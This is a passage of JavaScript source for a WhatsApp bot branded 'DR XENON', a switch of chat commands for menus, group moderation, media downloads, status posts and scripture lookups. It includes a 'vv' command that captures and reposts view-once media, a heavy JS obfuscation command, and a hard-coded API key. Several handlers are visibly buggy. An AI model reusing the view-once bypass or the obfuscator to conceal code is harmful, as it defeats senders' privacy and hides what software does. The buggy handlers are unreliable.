❐${prefix}wise-paired
❐${prefix}delpair

      [𝐑𝐄𝐋𝐈𝐆𝐈𝐎𝐍]
❐${prefix}bible
❐${prefix}quran

      [𝐒𝐓𝐀𝐓𝐔𝐒-𝐔𝐏𝐋𝐎𝐀𝐃]
❐${prefix}storyaudio
❐${prefix}storyvideo
❐${prefix}storyimage
❐${prefix}storytext
`
 await bot.sendMessage(m.chat, {  
            video: {url: "https://files.catbox.moe/uhvf46.mp4"},
gifPlayback: true,
            caption: allmenu,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐌𝐮𝐥𝐭𝐢 𝐃𝐞𝐯𝐢𝐜𝐞 𝐁𝐨𝐭",
                    newsletterJid: `120363294093005026@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `©⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ`,
                        
                   mediaType: 1,
                   renderLargerThumbnail: true,
                   thumbnailUrl: RandomMenu,
                   sourceUrl: 'https://youtube.com/@dr.xenon2?si=IZFb5jYv618VhSdU',
                }
            }
        },{ quoted: mdmodes }
     ),
       await bot.sendMessage(m.chat, { 
           audio: { url: 'https://files.catbox.moe/1u8hj8.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: loli }
     );
}
 break;
//==================================================//        
        case 'starterpanel': 
case 'cpanelmenu': {
inireact()
await loading()
let allmenu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻
┏❐  ⌜ ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ⌟  ❐
┃⭔ Creator :⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ 
┃⭔ Version : new version 
┃⭔ Type : Case
┃⭔ Status : Ready
┃⭔ Mode : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single 
┗❐
❐${prefix}1gb
❐${prefix}2gb
❐${prefix}3gb
❐${prefix}4gb
❐${prefix}5gb
❐${prefix}6gb
❐${prefix}7gb
❐${prefix}8gb
❐${prefix}9gb
❐${prefix}10gb
❐${prefix}unli
❐${prefix}listserver
`
 await bot.sendMessage(m.chat, {  
            video: {url: "https://files.catbox.moe/uhvf46.mp4"},
gifPlayback: true,
            caption: allmenu,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐌𝐮𝐥𝐭𝐢 𝐃𝐞𝐯𝐢𝐜𝐞 𝐁𝐨𝐭",
                    newsletterJid: `120363294093005026@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                                title: `©⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ`,
                  
                   mediaType: 1,
                   renderLargerThumbnail: true,
                   thumbnailUrl: RandomMenu,
                   sourceUrl: 'https://youtube.com/@dr.xenon2?si=IZFb5jYv618VhSdU',
                }
            }
        },{ quoted: mdmodes }
     ),
       await bot.sendMessage(m.chat, { 
           audio: { url: 'https://files.catbox.moe/1u8hj8.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: loli }
     );
}
 break;
//===============================================//
        case "ping": { 
  await loading ()     
    let timestamp = speed();
    let latency = speed() - timestamp;
    reply2(`🔹 Pong: ${latency.toFixed(4)} MS ⚡`);
} 
break;
          
//==================================================// 
case 'getbisnis': case 'getbusiness': {
  const moment = require('moment-timezone');
  let input = m.quoted ? m.quoted.sender : text || m.sender;
  input = input.replace(/[^+\d]/g, '');
  let target;
  if (input.startsWith('+')) {
    target = input.slice(1).replace(/^0+/, '') + '@s.whatsapp.net';
  } else if (input.startsWith('0')) {
    target = '225' + input.slice(1) + '@s.whatsapp.net';
  } else if (input.startsWith('62')) {
    target = input + '@s.whatsapp.net';
  } else if (input.includes('@s.whatsapp.net')) {
    target = input;
  } else {
    target = '225' + input + '@s.whatsapp.net';
  }

  try {
    const profile = await bot.getBusinessProfile(target);
    const name = await bot.getName(target); 
    const pfp = await bot.profilePictureUrl(target, 'image').catch(() => null);
    const desc = profile.description || 'invalid.';
    const category = profile.category ||'invalid';
    const website = profile.website || 'invalid';
    const address = profile.address || 'invalid';
    const email = profile.email || 'invalid';
    const caption = `*📇Business profile*\n\n` +
      `*👤 Name:* ${name}\n` +
      `*🏢 Category:* ${category}\n` +
      `*🌐 Website:* ${website}\n` +
      `*📍 Address:* ${address}\n` +
      `*✉️ Email:* ${email}\n\n` +
      `*📝 Description:*\n${desc}`;
    if (pfp) {
      await bot.sendMessage(m.chat, {
        image: { url: pfp },
        caption,
      }, { quoted: m });
    } else {
      m.reply(caption);
    }
  } catch (err) {
    console.error(err);
    m.reply('error.');
  }
}
break 
//==================================================//    
        case "invite": case "link": { 
                 if (!m.isGroup) return reply (mess.group); 
                 if (!isBotAdmins) return reply ("bot must be admin in group"); 
                 let response = await bot.groupInviteCode(m.chat); 
                 bot.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject}`, m, { detectLink: true }); 
             } 
          break;
        //==================================================//
        case 'public': {
if (!Owner) return reply(mess.owner)
bot.public = true
reply('Sukses changed to public mode')
}
break
//==================================================//      
case 'self': {
if (!Owner) return reply(mess.owner)
bot.public = false
reply('Success changed to self mode')
}
break
//==================================================//
     case 'onlyprivatechat':
            case 'onlypc':
                if (!Owner) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlypc = true
                    reply(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlypc = false
                    reply(`Successfully Changed Only-Pc To ${q}`)
                }
            break  
//==================================================//      
     case 'onlygroup':
            case 'onlygc':
                if (!Owner) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    db.data.settings[botNumber].onlygrub = true
                    reply(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlygrub = false
                    reply(`Successfully Changed Onlygroup To ${q}`)
                }
            break //==================================================//
case 'kick': {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply("le bot doit d'abord être administrateur")
if (!Owner) return reply(mess.owner)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await bot.groupParticipantsUpdate(m.chat, [users], 'remove')
reply(`Sukses kick @${users.split('@')[0]}`)
}
break
//==================================================//                     
            case "take": {
                if (!args.join(" ")) return reply(`\n*ex:* ${prefix + command} Mmk\n`)
                const swn = args.join(" ")
                const pcknm = swn.split("|")[0]
                const atnm = swn.split("|")[1]
                if (m.quoted.isAnimated === true) {
                    bot.downloadAndSaveMediaMessage(quoted, "gifee")
                    bot.sendMessage(m.chat, {
                        sticker: fs.readFileSync("./list/Temporary gifee.webp")
                    }, m, {
                        packname: pcknm,
                        author: atnm
                    })
                } else if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await bot.sendImageAsSticker(m.chat, media, m, {
                        packname: pcknm,
                        author: atnm
                    })
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 10) return reply('\nmaximum duration 10 seconds\n')
                    let media = await quoted.download()
                    let encmedia = await bot.sendVideoAsSticker(m.chat, media, m, {
                        packname: pcknm,
                        author: atnm
                    })
                } else {
                    reply(`\n*ex:* reply image/video ${prefix + command}\n`)
                }
            }
                break

//==================================================//              
        case "movie": 
             if (!text) return reply(`Provide a series or movie name.`);  
              let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`);  
              let imdbt = "";  
              console.log(fids.data)  
              imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB MOVIE SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n";  
              imdbt += "🎬Title      : " + fids.data.Title + "\n";  
              imdbt += "📅Year       : " + fids.data.Year + "\n";  
              imdbt += "⭐Rated      : " + fids.data.Rated + "\n";  
              imdbt += "📆Released   : " + fids.data.Released + "\n";  
              imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n";  
              imdbt += "🌀Genre      : " + fids.data.Genre + "\n";  
              imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n";  
              imdbt += "✍Writer     : " + fids.data.Writer + "\n";  
              imdbt += "👨Actors     : " + fids.data.Actors + "\n";  
              imdbt += "📃Plot       : " + fids.data.Plot + "\n";  
              imdbt += "🌐Language   : " + fids.data.Language + "\n";  
              imdbt += "🌍Country    : " + fids.data.Country + "\n";  
              imdbt += "🎖️Awards     : " + fids.data.Awards + "\n";  
              imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n";  
              imdbt += "🏙️Production : " + fids.data.Production + "\n";  
              imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n";  
              imdbt += "❎imdbVotes  : " + fids.data.imdbVotes + "";  
             bot.sendMessage(from, {  
                  image: {  
                      url: fids.data.Poster,  
                  },  
                  caption: imdbt,  
              },  
                 { quoted: m }); 
  
                       break;
//==================================================//             
        case "setppgc": {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.adminbot)
if (!isBotAdmins) return reply(mess.admin)
if (/image/g.test(mime)) {
let media = await bot.downloadAndSaveMediaMessage(qmsg)
await bot.updateProfilePicture(m.chat, {url: media})
await fs.unlinkSync(media)
reply("Group profile photo changed successfully by ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ")
} else return m.reply('tag/reply foto')}
break
//==================================================//     
        case 'creategc': case 'creategroup': {
if (!Owner) return reply(mess.owner)
if (!args.join(" ")) return reply(`Use ${prefix+command} groupname`)
try {
let cret = await bot.groupCreate(args.join(" "), [])
let response = await bot.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
bot.sendMessage(m.chat, { text:teksop, mentions: await bot.parseMention(teksop)}, {quoted:m})
} catch {
	reply(`Error`)
	}
}
break
//==================================================//              
        case "open": {
if (!isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply("le bot doit d'abord être administrateur")
if (!Owner) return m.reply(mess.owner)
await bot.groupSettingUpdate(m.chat, 'not_announcement')
reply("Success opened group chat,all members can send messages in group now")
}
break
//==================================================//               
        case "vv": case "readviewonce": case "•": {
if (!m.quoted) return reply("reply to a view once media")
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("this is not a view once message!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return bot.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || "Retrieved by ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ"}, {quoted: m})
    } else if (/image/.test(type)) {
        return bot.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || "Retrieved by ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ"}, {quoted: m})
    } else if (/audio/.test(type)) {
        return bot.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
//==================================================//            
        case "apk":
      case "apkdl":
        {
          if (!text) return reply("*Which apk do you want to download?*");
        let kyuu = await fetchJson (`https://bk9.fun/search/apk?q=${text}`);
        let tylor = await fetchJson (`https://bk9.fun/download/apk?id=${kyuu.BK9[0].id}`);
         await bot.sendMessage(
              m.chat,
              {
                document: { url: tylor.BK9.dllink },
                fileName: tylor.BK9.name,
                mimetype: "application/vnd.android.package-archive",
                contextInfo: {
        externalAdReply: {
          title: global.botname,
          body: `${tylor.BK9.name}`,
          thumbnailUrl: `${tylor.BK9.icon}`,
          sourceUrl: `${tylor.BK9.dllink}`,
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: loli });
          }
      break;
//==================================================//              
  case "ytmp4":
case "ytvideo": {
 if (!q) return reply(`Example: ${prefix + command} https://youtube.com/watch?v=CVLeZpg6Kzk 144/240/360/480/720/1080`);
 const args = q.split(' ');
 const url = args[0];
 const availableResolutions = ['144', '240', '360', '480', '720', '1080'];
 let quality = args[1] && availableResolutions.includes(args[1]) ? args[1] : '480';
 if (!url.match(/^(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/)) {
 return reply(`Please provide a valid YouTube URL\n\nAvailable resolutions: ${availableResolutions.join(', ')}`);
 }
 reply(`processing your request`);
 try {
 const apiUrl = `https://api.hiuraa.my.id/downloader/savetube?url=${encodeURIComponent(url)}&format=${quality}`;
 const response = await fetch(apiUrl);
 const data = await response.json();
 if (!data.status || !data.result) {
 return reply('Failed to download the video');
 }
 const { title, duration, thumbnail, download } = data.result;
 await bot.sendMessage(m.chat, {
 image: { url: thumbnail },
 caption: `*${title}*\n*${quality}p* | *${duration}*`
 }, { quoted: loli });
 
 await bot.sendMessage(m.chat, {
 video: { url: download },
 mimetype: 'video/mp4'
 }, { quoted: loli });
 
 } catch (error) {
 console.error('Error downloading YouTube video:', error);
 reply('An error occurred while downloading the video');
 }
 }
 break  
//==================================================//           
    case 'git': case 'gitclone':
if (!args[0]) return reply(`Where is the link?\nExample :\n${prefix}${command} https://github.com/Dr.Xenon2`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    bot.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: loli }).catch((err) => reply(mess.error))
break
//==================================================//                   
        case 'setppgroup': {
if (!isGroup) return reply('Only Group')
if (!isAdmins) return reply('Only Admin')
if (!isBotAdmins) return reply('make bot an admin in this group first idiot')
if (!quoted) return reply(`*Where is the picture?*`)
if (!/image/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var mediz = await bot.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await bot.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
reply(`*Success Beb✅*`)
} else {
var memeg = await bot.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
reply(`*Success Beb✅*`)
}
}
break
//==================================================//          
case "close": {
if (!isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply("le bot doit d'abord être administrateur")
if (!Owner) return m.reply(mess.owner)
await bot.groupSettingUpdate(m.chat, 'announcement')
reply("Succes au chat de groupe fermé, tous les membres ne sont pas autorisés à discuter pour le moment")
}
break
//==================================================//        
        case 'storyaudio':
			case 'upswaudio': {
				if (!Owner) return reply(mess.owner);
				if (/audio/.test(mime)) {
					var audiosw = await bot.downloadAndSaveMediaMessage(quoted);
					await bot.sendMessage('status@broadcast', {
						audio: { url: audiosw },
						mimetype: 'audio/mp4',
						ptt: true
					}, {
						backgroundColor: '#FF000000',
						statusJidList: Object.keys(db.data.users)
					});
					await reply('✅ success upload audio to status!');
				} else {
					reply('⚠️ Reply to audio with command ! 🎧');
				}
			}
			break;
//==================================================//          
        case 'storyimg':
			case 'storyimage':
			case 'upswimg': {
				if (!Owner) return m.reply(mess.owner);
				if (/image/.test(mime)) {
					var imagesw = await bot.downloadAndSaveMediaMessage(quoted);
					let fileSize = quoted.fileLength ? `${(quoted.fileLength / 1024 / 1024).toFixed(2)} MB` : 'Inconnu';
					let mediaType = mime || 'Inconnu';
					let sendTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
					let sender = `${m.pushName || ownerName}`;
					let defaultCaption = `📁 *Taille du fichier*: ${fileSize}\n`;
					defaultCaption += `🖼️ *Type de média*: ${mediaType}\n`;
					defaultCaption += `⏰ *Time*: ${sendTime}\n`;
					defaultCaption += `👤 *Sender*: ${sender}`;
					await bot.sendMessage('status@broadcast', {
						image: { url: imagesw },
						caption: text ? text : defaultCaption
					}, {
						statusJidList: Object.keys(db.data.users)
					});

					await reply('✅ success uploaded photo to status! 🖼️✨');
				} else {
					m.reply('⚠️ reply to image with command ! 🖼️');
				}
			}
			break;
//==================================================//           
        case 'storyvideo':
			case 'upswvideo': {
				if (!Owner) return m.reply(mess.owner);
				if (/video/.test(mime)) {
					var videosw = await bot.downloadAndSaveMediaMessage(quoted);
					let fileSize = quoted.fileLength ? `${(quoted.fileLength / 1024 / 1024).toFixed(2)} MB` : 'Inconnu';
					let mediaType = mime || 'Inconnu';
					let sendTime = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
					let sender = `${m.pushName || ownerName}`;
					let defaultCaption = `📁 *Taille du fichier*: ${fileSize}\n`;
					defaultCaption += `🎥 *Type de média*: ${mediaType}\n`;
					defaultCaption += `⏰ *Time*: ${sendTime}\n`;
					defaultCaption += `👤 *Expéditeur*: ${sender}`;
					await bot.sendMessage('status@broadcast', {
						video: { url: videosw },
						caption: text ? text : defaultCaption
					}, {
						statusJidList: Object.keys(db.data.users)
					});

					await m.reply('✅ success uploaded video to status!');
				} else {
					m.reply('⚠️ réponds à une vidéo ! 🎥');
				}
			}
			break;
//==================================================//          
        case 'storytext':
			case 'upswtext': {
				if (!Owner) return m.reply(mess.owner);
				if (!text) return m.reply('where is the text?');
				await bot.sendMessage('status@broadcast', { 
					text: text 
				}, { 
					backgroundColor: '#FF000000', 
					font: 3, 
					statusJidList: Object.keys(db.data.users) 
				});
				m.reply('Succes uploaded text!');
			}
			break;
//==================================================//   
        case "listidch": case "listid": {
if (channel.length < 1) return reply("id channel not found")
let teks = `\n *Total ID Channel :* ${channel.length}\n`
for (let i of channel) {
let res = await bot.newsletterMetadata("jid", i)
teks += `\n* ${i}
* ${res.name}\n`
}
bot.sendMessage(m.chat, {text: teks, mentions: []}, {quoted: m})
}
break
//==================================================//            
        case 'enc':
case 'encrypt': {
const JsConfuser = require('js-confuser')

if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.quotedMessage) {
return reply('❌ Please Reply File To Be Encryption.');
}
const quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;
const quotedDocument = quotedMessage.documentMessage;
if (!quotedDocument || !quotedDocument.fileName.endsWith('.js')) {
return reply('❌ Please Reply File To Be Encryption.');
}
try {
const fileName = quotedDocument.fileName;
const docBuffer = await m.quoted.download();
if (!docBuffer) {
return reply('❌ Please Reply File To Be Encryption.');
}
await bot.sendMessage(m.chat, {
 react: { text: '🕛', key: m.key }
 });
const obfuscatedCode = await JsConfuser.obfuscate(docBuffer.toString(), {
target: "node",
preset: "high",
compact: true,
minify: true,
flatten: true,
identifierGenerator: function () {
const originalString = "素DR晴XENON晴" + "素DR晴XENON晴";
const removeUnwantedChars = (input) => input.replace(/[^a-zA-Z素GIDDY晴TENNOR晴]/g, "");
const randomString = (length) => {
let result = "";
const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * characters.length));
}
return result;
};
return removeUnwantedChars(originalString) + randomString(2);
},
renameVariables: true,
renameGlobals: true,
stringEncoding: true,
stringSplitting: 0.0,
stringConcealing: true,
stringCompression: true,
duplicateLiteralsRemoval: 1.0,
shuffle: { hash: 0.0, true: 0.0 },
stack: true,
controlFlowFlattening: 1.0,
opaquePredicates: 0.9,
deadCode: 0.0,
dispatcher: true,
rgf: false,
calculator: true,
hexadecimalNumbers: true,
movedDeclarations: true,
objectExtraction: true,
globalConcealing: true,
});
await bot.sendMessage(m.chat, {
document: Buffer.from(obfuscatedCode, 'utf-8'),
mimetype: 'application/javascript',
fileName: `${fileName}`,
caption: `•Successful Encrypt
•Type: Hard Code
•@Tennormodz`,
}, { quoted: loli });

} catch (err) {
console.error('Error during encryption:', err);
await reply(`❌ An error occurred: ${error.message}`);
}
break;
}
//==================================================//            
        case "cekidgc": {
if (!Owner) return reply('*Only Owner*') 
let getGroups = await bot.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `𖥂 *List Groups*\n\n💺Total Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await bot.groupMetadata(x)
teks += `⿻ *INFO GROUP*\n│𖥂 *NAME:* ${metadata2.subject}\n│𖥂 *ID :* ${metadata2.id}\n│𖥂 *MEMBER :* ${metadata2.participants.length}\n╰────|⿻\n\n`
}
reply(teks)
}
break
//==================================================//                
        case "block": { 
 if (!Owner) return reply (mess.owner) 
 if (!m.quoted) throw `𝗧𝗮𝗴 𝘀𝗼𝗺𝗲𝗼𝗻𝗲!`  
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
	 if (users == "2250500107362@s.whatsapp.net") return m.reply("𝗜 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗹𝗼𝗰𝗸 𝗺𝘆 𝗢𝘄𝗻𝗲𝗿 😡");
		  if (users  == bot.decodeJid(bot.user.id)) throw '𝗜 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗹𝗼𝗰𝗸 𝗺𝘆𝘀𝗲𝗹𝗳 𝗶𝗱𝗶𝗼𝘁 😡';
 await bot.updateBlockStatus(users, 'block'); 
 reply (`𝗕𝗹𝗼𝗰𝗸𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆!`); 
 } 
 break; 
//==================================================// 
        case 'idch': case 'cekidch': {
if (!text) return reply("channel link?")
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link must be valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await bot.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Name :* ${res.name}
* *Total Followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: "𝐖𝐢𝐬𝐞-𝐀𝐥" }, //input watermark footer
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : loli });
await bot.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break
//==================================================//            
        case 'bible': {
  	const { translate } = require('@vitalets/google-translate-api')
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Veuillez préciser le numéro ou le nom du chapitre. Exemple : ${prefix + command} Jean 3:16`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `
📖 *La Sainte Bible*\n
📜 *Chapitre ${chapterData.reference}*\n
Type : ${chapterData.translation_name}\n
Nombre de versets : ${chapterData.verses.length}\n
🔮 *Contenu du chapitre (anglais) :*\n
${translatedChapterEnglish.text}\n
🔮 *Contenu du chapitre (hindi) :*\n
${translatedChapterHindi.text}`
    reply(bibleChapter)
  } catch (error) {
    m.reply(`Error: ${error.message}`)
  }
  }
  break
//==================================================//         
        case 'quran': {
    try {
    
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Veuillez préciser le numéro ou le nom de la sourate`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`Impossible de trouver la sourate avec le numéro ou le nom « ${surahInput} »`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`La requête API a échoué avec le statut ${res.status} et le message ${error.message}`)
    }

    let json = await res.json()

    
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Coran : Le Livre sacré*\n
📜 *Sourate ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type : ${json.data.type.en}\n
Nombre de versets : ${json.data.ayahCount}\n
🔮 *Explication (ourdou) :*\n
${translatedTafsirUrdu.text}\n
🔮 *Explication (anglais) :*\n
${translatedTafsirEnglish.text}`

    m.reply(quranSurah)

    if (json.data.recitation.full) {
      bot.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    m.reply(`Error: ${error.message}`)
  }
  }
  break
//==================================================//              
        case 'listpc': {
if (!Owner) return reply(mess.owner);
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*Private Chat*\nTotal: ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${pushname}\n*User :* @${sender.split('@')[0]}\n*Chat :* https://wa.me/${sender.split('@')[0]}\n\n───────────\n\n`
}
reply(teks)
}
break
//==================================================//      
        case 'add': {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.group)
if (!Owner) return reply(mess.owner)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await bot.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
//==================================================//           
        case 'reject': case 'reject-all': {
	if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.group)
if (!isBotAdmins) return m.reply("le bot doit être un idiot administrateur")

const responseList = await bot.groupRequestParticipantsList(m.chat);

if (responseList.length === 0) return m.reply("aucune demande en attente détectée");

for (const participan of responseList) {
    const response = await bot.groupRequestParticipantsUpdate(
        m.chat, 
        [participan.jid], // Approve/reject each participant individually
        "reject" // or "reject"
    );
    console.log(response);
}
m.reply("les demandes en attente ont été rejetées !");

}
 break;
//==================================================//           
        case 'autoswview':
    case 'statusview':{
             if (!Owner) return reply(mess.owner)
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  antiautostatus = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  antiautostatus = true
                  reply(`${command} is disabled`)
               }
            }
            break
//==================================================//              
        case "unblock": { 
 if (!Owner) return reply (mess.owner) 
 if (!m.quoted) throw `𝗧𝗮𝗴 𝘀𝗼𝗺𝗲𝗼𝗻𝗲!`; 
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'; 
 await client.updateBlockStatus(users, 'unblock'); 
 m.reply (`𝗨𝗻𝗯𝗹𝗼𝗰𝗸𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆✅!`); 
 } 
 break;
//==================================================//             
        case 'gcprofile': {
 function convertTimestamp(timestamp) {
  const d = new Date(timestamp * 1000);
  const daysOfWeek = ['Dimanche', 'Lundi', 'Mardi', 'Mercredi', 'Jeudi', 'Vendredi', 'Samedi'];
  return {
    date: d.getDate(),
